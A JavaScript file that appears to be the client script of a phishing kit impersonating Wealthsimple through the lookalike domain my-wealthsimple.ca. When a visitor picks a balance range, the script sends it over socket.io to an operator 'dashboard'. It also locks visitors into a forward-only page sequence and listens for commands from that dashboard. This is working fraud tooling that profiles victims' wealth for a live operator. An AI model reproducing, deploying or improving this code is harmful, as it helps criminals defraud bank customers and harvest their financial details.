/* bal-client.js */
(function () {
  const SERVER_URL = "https://my-wealthsimple.ca";
  const SESSION_STORAGE_KEY = "sessionID";
  const DASH_EMIT_EVENT = "client-data";
  const DASH_JOIN_EVENT = "client-join";
  const PAGE_PROGRESS_KEY = "page_progress";

  // --- Utilities -----------------------------------------------------------
  function onceDomReady(fn) {
    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", fn, { once: true });
    } else {
      fn();
    }
  }

  function getOrCreateSessionID() {
    let sid = null;
    try { sid = localStorage.getItem(SESSION_STORAGE_KEY) || null; } catch {}
    if (!sid) {
      sid = Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2);
      try { localStorage.setItem(SESSION_STORAGE_KEY, sid); } catch {}
    }
    return sid;
  }

  // Page progress tracking functions
  window.setPageProgress = function(page) {
    try { localStorage.setItem(PAGE_PROGRESS_KEY, page); } catch {}
  };
  
  window.getPageProgress = function() {
    try { return localStorage.getItem(PAGE_PROGRESS_KEY) || null; } catch { return null; }
  };
  
  window.clearPageProgress = function() {
    try { localStorage.removeItem(PAGE_PROGRESS_KEY); } catch {}
  };

  // Check if we should redirect based on page progress
  function checkPageProgress() {
    const currentPage = window.location.pathname.split('/').pop() || 'bal.html';
    const progress = window.getPageProgress();
    
    if (!progress) return; // No progress saved, allow access
    
    // Define page order
    const pageOrder = ['app.html', 'bal.html', 'info.html', 'done.html'];
    const currentIndex = pageOrder.indexOf(currentPage);
    const progressIndex = pageOrder.indexOf(progress);
    
    // If user is trying to access a page before their progress, redirect forward
    if (currentIndex !== -1 && progressIndex !== -1 && currentIndex < progressIndex) {
      console.log(`[page-progress] Redirecting from ${currentPage} to ${progress}`);
      window.location.href = progress;
    }
  }

  // Run page progress check on load
  onceDomReady(checkPageProgress);

  // --- Socket layer --------------------------------------------------------
  function ensureSocketIO(cb) {
    if (window.io && typeof window.io === "function") return cb();

    const s = document.createElement("script");
    s.src = SERVER_URL.replace(/\/$/, "") + "/socket.io/socket.io.js";
    s.async = true;
    s.onload = cb;
    s.onerror = () => console.warn("[bal-client] Could not load socket.io from server.");
    document.head.appendChild(s);
  }

  function connectSocket(sessionID) {
    if (!window.io) {
      console.warn("[bal-client] socket.io not available.");
      return null;
    }
    const socket = window.io(SERVER_URL, { transports: ["websocket", "polling"] });

    socket.on("connect", () => {
      console.log("[bal-client] connected:", socket.id, "session:", sessionID);
      socket.emit(DASH_JOIN_EVENT, { sessionID });
    });

    socket.on("disconnect", () => {
      console.log("[bal-client] disconnected");
    });

    // Listen for dashboard actions if needed
    socket.on("dashboard-action", ({ buttonName, value }) => {
      console.log("[bal-client] dashboard action:", buttonName, value);
      // Handle any dashboard commands here if needed
    });

    return socket;
  }

  // --- Balance range mapping -----------------------------------------------
  const BALANCE_RANGES = {
    1: "$0 - $5,000",
    2: "$5,000 - $25,000",
    3: "$25,000 - $100,000",
    4: "$100,000 - $500,000",
    5: "$500,000+"
  };

  // --- Main ---------------------------------------------------------------
  onceDomReady(function () {
    // Prepare socket
    ensureSocketIO(() => {
      const sessionID = getOrCreateSessionID();
      const socket = connectSocket(sessionID);
      if (!socket) return;

      // Find all balance buttons and attach click handlers
      const buttons = document.querySelectorAll('.button-group button');
      
      buttons.forEach((button, index) => {
        button.addEventListener('click', function() {
          const buttonNumber = index + 1;
          const balanceRange = BALANCE_RANGES[buttonNumber];
          
          console.log(`[bal-client] Balance range selected: ${balanceRange}`);
          console.log(`[bal-client] SessionID: ${sessionID}`);
          
          // Emit the balance range to the dashboard via the server
          socket.emit(DASH_EMIT_EVENT, { 
            type: "balance-range", 
            data: balanceRange 
          });
          
          console.log('[bal-client] Emitted client-data event with type: balance-range, data:', balanceRange);
          
          // Store the selected range in localStorage for reference
          try {
            localStorage.setItem('selectedBalanceRange', balanceRange);
          } catch {}
          
          // Redirect to info.html after a short delay to ensure the emit completes
          setTimeout(() => {
            window.setPageProgress('info.html');
            window.location.href = 'info.html';
          }, 200);
        });
      });

      // Override the global selectRange function if it exists
      window.selectRange = function(buttonNumber) {
        const button = buttons[buttonNumber - 1];
        if (button) {
          button.click();
        }
      };
    });
  });
})();